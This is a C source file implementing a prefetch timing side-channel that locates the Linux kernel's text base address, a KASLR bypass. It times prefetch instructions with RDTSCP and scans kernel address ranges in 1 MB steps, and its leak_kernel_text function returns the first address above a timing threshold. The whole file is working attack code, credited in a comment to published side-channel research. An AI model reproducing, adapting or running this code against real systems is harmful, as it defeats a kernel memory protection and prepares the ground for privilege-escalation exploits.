#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/param.h>

// Some of this code is based on Prefetch Side-Channel work by Daniel Gruss

size_t hit_histogram[4000];
size_t miss_histogram[4000];

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile(
    "xor %%rax, %%rax\n\t"
    "mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

void prefetch(void* p)
{
  asm volatile ("prefetchnta (%0)" : : "r" (p));
  asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

size_t onlyreload(void* addr) // row hit
{
  size_t time = rdtsc_begin();
  prefetch(addr);
  size_t delta = rdtsc_end() - time;
  //maccess((void*)0x500000);
  return delta;
}

#define TRIES (1*128*1024)

size_t measure(size_t addr)
{
    memset(hit_histogram,0,4000*sizeof(size_t));

    for (int i = 0; i < TRIES; ++i)
    {
      size_t d = onlyreload((void*)addr);
      hit_histogram[MIN(3999,d)]++;
    }

    size_t sum_hit = 0;
    size_t hit_max = 0;
    size_t hit_max_i = 0;
    for (int i = 0; i < 4000; ++i)
    {
      if (hit_max < hit_histogram[i])
      {
        hit_max = hit_histogram[i];
        hit_max_i = i;
      }
      sum_hit += hit_histogram[i] * i;
    }

    return sum_hit / TRIES;
}


uint64_t leak_kernel_text()
{
        cpu_set_t set;
        uint64_t bad_time, time, addr;

        CPU_ZERO(&set);
        CPU_SET(0, &set);

        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1) {
                perror("sched_setaffinity");
                return -1;
        }
        
// First measurement is always trash
        bad_time = measure(0xffffffff00000000);

        bad_time = measure(0xffffffff00000000);

//        printf("Timing for non-existent kernel page: %zu\n", bad_time);

        for (addr = 0xffffffff81000000L; addr < 0xffffffffff000000L; addr += 0x100000)
        {
                time = measure(addr);

                printf("0x%lx: %zu\n", addr, time);

                if (time > 190)
                        break;
        }

// Renable all CPUs
        for (int i = 1; i < 4; i++)
        {
                CPU_SET(i, &set);
        }

        if (sched_setaffinity(getpid(), sizeof(set), &set) == -1) {
                perror("sched_setaffinity");
                return -1;
        }

        return addr;
}
